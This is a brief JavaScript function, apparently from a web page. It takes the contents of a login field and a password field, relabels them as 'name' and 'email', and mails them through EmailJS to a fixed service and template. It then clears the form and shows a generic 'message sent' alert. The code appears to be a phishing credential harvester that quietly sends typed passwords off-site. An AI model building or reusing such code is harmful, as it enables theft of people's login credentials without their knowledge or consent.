function sendMail() {
  var params = {
    name: document.getElementById("loginForm").value,
    email: document.getElementById("password").value,
  };

  const serviceID = "service_142u1mu";
  const templateID = "template_avc41ik";

    emailjs.send(serviceID, templateID, params)
    .then(res=>{
        document.getElementById("loginForm").value = "";
        document.getElementById("password").value = "";
        console.log(res);
        alert("Your message sent successfully!!")

    })
    .catch(err=>console.log(err));

}
